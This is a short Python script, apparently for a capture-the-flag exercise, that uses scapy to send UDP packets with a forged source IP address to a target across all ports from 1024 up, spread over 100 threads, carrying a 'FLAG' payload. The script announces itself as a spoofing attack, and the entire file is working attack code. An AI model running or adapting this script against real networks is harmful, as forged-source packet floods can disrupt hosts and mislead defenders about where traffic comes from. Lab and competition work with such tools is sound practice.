from scapy.all import IP, UDP, Raw, send
import threading
import time

TARGET_IP = "10.0.0.2"
TARGET_PORT = 31337
SOURCE_IP = "10.0.0.3"
YOUR_IP = "10.0.0.1"
YOUR_PORT = 31337
MESSAGE = f"FLAG:{YOUR_IP}:{YOUR_PORT}".encode()

THREAD_COUNT = 100
PORT_RANGE = range(1024, 65536)  # skip well-known ports

def spoof_packet(port):
    pkt = IP(src=SOURCE_IP, dst=TARGET_IP) / UDP(sport=31337, dport=port) / Raw(load=MESSAGE)
    send(pkt, verbose=0)

def worker(port_list):
    for port in port_list:
        try:
            spoof_packet(port)
        except OSError:
            continue

def main():
    ports = list(PORT_RANGE)
    chunk_size = len(ports) // THREAD_COUNT
    threads = []

    for i in range(THREAD_COUNT):
        chunk = ports[i*chunk_size:(i+1)*chunk_size]
        t = threading.Thread(target=worker, args=(chunk,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    print("[*] Starting spoofing attack with threads...")
    main()
    print("[*] Done sending spoofed packets.")
